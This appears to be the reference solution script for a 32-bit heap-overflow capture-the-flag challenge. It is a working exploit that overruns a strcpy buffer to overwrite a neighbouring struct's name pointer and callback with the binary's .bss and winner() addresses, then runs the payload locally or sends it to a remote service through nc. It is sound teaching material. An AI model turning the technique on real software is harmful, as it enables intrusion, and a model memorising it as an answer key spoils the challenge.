#!/bin/sh
# Reference solution (shell form) for cylab-heap-havoc (32-bit).
# Two "struct internet" objects sit back-to-back on the heap. strcpy() of
# argv[1] into i1->name has no bounds check, so a long argv[1] overruns
# i1->name and i2's whole struct. We set i2->name to a writable address
# (so the later strcpy(i2->name, argv[2]) does not crash) and i2->callback
# to winner(), which main() then calls.
#
# argv[1] layout (32-bit, 4-byte fields):
#   16 bytes filler   -> reaches the start of i2
#    4 bytes filler   -> i2->priority
#    4 bytes addr     -> i2->name   (writable: the binary's .bss)
#    4 bytes addr     -> i2->callback (winner)
#
# The binary is not a PIE, so both addresses are fixed -- read out of it
# with nm/readelf, emitted little-endian as octal escapes for printf '%b'.
#
# Usage:
#   ./solve.sh               solve a local ./chall  (needs ./chall and ./flag.txt here)
#   ./solve.sh HOST PORT     solve a deployed service over the network, via nc

WINNER=0x$(nm ./chall | awk '$3=="winner"{print $1}')
BSS=0x$(readelf -S ./chall | awk '/\.bss/{print $4; exit}')

p32() {
	printf '\\0%o\\0%o\\0%o\\0%o' \
		$(($1 & 255)) $(($1/256 & 255)) $(($1/65536 & 255)) $(($1/16777216 & 255))
}

FILLER=$(printf 'A%.0s' $(seq 1 16))
ARG1="${FILLER}BBBB$(p32 "$BSS")$(p32 "$WINNER")"
ARG2="x"

if [ "$#" -ge 2 ]; then
	# The deploy wrapper reads two lines and re-execs them as argv[1]/argv[2].
	printf '%b\n%s\n' "$ARG1" "$ARG2" | nc "$1" "$2"
else
	# Local: run through the shipped 32-bit loader so the bundled libc is used.
	argv1=$(printf '%b' "$ARG1")
	if [ -x ./ld-linux.so.2 ]; then
		./ld-linux.so.2 --library-path . ./chall "$argv1" "$ARG2"
	else
		./chall "$argv1" "$ARG2"
	fi
fi
